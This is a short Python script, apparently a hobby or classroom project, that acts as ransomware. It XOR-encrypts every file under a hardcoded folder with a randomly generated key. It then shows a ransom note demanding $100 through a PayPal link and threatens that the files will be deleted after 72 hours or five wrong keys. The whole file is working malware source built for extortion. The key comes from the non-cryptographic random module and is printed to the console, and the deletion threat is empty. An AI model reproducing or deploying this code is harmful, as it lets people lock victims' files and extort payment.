import os
import random

def generatekey():
    key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;?@[]{}|'
    key_char_pool_len = len(key_char_pool)
    ENCRYPTION_LEVEL = 512 // 8
    key = ''
    for i in range(ENCRYPTION_LEVEL):
        key += key_char_pool[random.randint(0,key_char_pool_len-1)]
    print(key)
    getfiles(key)

def getfiles(key):
    path = r"C:\Users\pierr\source\repos\Cryptographie\Cryptographie\to_encrypt"
    list_of_files = []
    for root, dirs, files in os.walk(path):
        for file in files:
            list_of_files.append(os.path.join(root,file))
    encrypt(key,list_of_files)

def encrypt(key,list_of_files):
    for file in list_of_files:
            try:
                key_index= 0
                max_key_index= len(key)-1
                with open(file,'rb') as f:
                    data=f.read()
                with open(file,'w') as f:
                    f.write('')
                for byte in data:
                    xor_bytes = byte ^ ord(key[key_index])
                    with open(file,'ab') as f:
                        f.write(xor_bytes.to_bytes(1,'little'))
                    #Increment key index
                    if key_index >= max_key_index:
                        key_index=0
                    else:
                        key_index+=1
            except:
                print("encryption failed for file:"+str(file))
    anthentificator(key,list_of_files)

def decrypt(key,list_of_files):
    for file in list_of_files:
            try:
                key_index= 0
                max_key_index= len(key)-1
                with open(file,'rb') as f:
                    data=f.read()
                with open(file,'w') as f:
                    f.write('')
                for byte in data:
                    xor_bytes = byte ^ ord(key[key_index])
                    with open(file,'ab') as f:
                        f.write(xor_bytes.to_bytes(1,'little'))
                    #Increment key index
                    if key_index >= max_key_index:
                        key_index=0
                    else:
                        key_index+=1
            except:
                print("Decryption failed for file: "+str(file))

def anthentificator(key,list_of_files):
    number_of_try=5
    print("Your file are now encrypted.")
    print("Please pay 100$ at https://www.paypal.com/ca/home to get the key to unlock your files.")
    print("Note that you have only 5 try to reedem the key and 72h to recover your files before they get delete forever.")
    while number_of_try != 0:
        userkey = str(input("Please enter your provided key here: "))
        if userkey == key:   
            decrypt(key,list_of_files)
            print("Your files are now decrypted")
            break
        else:
            number_of_try=number_of_try-1
            print(str(number_of_try) +" try left")
    else:
        print("Sorry.Your files has been destroy")    
              
generatekey()     